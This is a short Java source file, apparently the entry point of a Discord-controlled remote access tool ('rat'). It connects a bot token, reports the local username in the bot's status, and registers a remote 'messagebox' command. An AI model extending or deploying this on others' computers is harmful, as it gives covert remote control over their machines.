package ml.hashy.rat;

import io.github.cdimascio.dotenv.Dotenv;
import ml.hashy.rat.commands.MessageBox;
import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Activity;
import net.dv8tion.jda.api.interactions.commands.build.Commands;

public class Main {

    public static JDA jda = null;

    public static void main(String[] args) throws InterruptedException {
        Dotenv dotenv = Dotenv.load();

        jda = JDABuilder.createLight(dotenv.get("DISCORD_TOKEN"))
                .setActivity(Activity.playing(String.format("on %s's computer!", System.getProperty("user.name"))))
                .addEventListeners(new MessageBox())
                .build();

        jda.awaitReady();

        jda.getGuildById("1065344340337107034").updateCommands().addCommands(Commands.slash("messagebox", "Open a message box")).queue();
    }

}
